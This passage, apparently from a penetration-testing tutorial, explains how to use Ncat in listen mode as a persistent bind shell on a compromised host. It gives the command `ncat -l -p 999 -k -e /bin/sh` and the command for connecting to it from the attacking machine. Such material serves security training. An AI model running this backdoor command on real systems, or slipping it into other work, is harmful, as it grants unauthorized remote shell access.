`Ncat` has been used as a Telnet replacement up until now. Instead of using Ncat to connect to other computers, we can also set up Ncat to listen mode. Listen mode allows us to install Ncat on a compromised machine, run it on any port of our choosing, and then connect to it with another copy of Ncat on our attacking computer. We can start Ncat in listen mode and then bind the bash shell to it, allowing us to pass commands to the target host. Also, we can freely disconnect and reconnect to the listening Ncat on the target system.

The command below will start Ncat in listen mode. The -k option forces it to stay in listen mode even when a client disconnects (this is an important option). The -p option selects the port and the -e binds the command shell to the selected port.

    ncat -l -p 999 -k -e /bin/sh

To see if we can connect to the listener, we can enter the following command:
        
        ncat skillsetlocal.com 999
        
You have command line access to the target. You can try entering an OS command to verify (you won't see any kind of prompt, just enter the command in the new line):
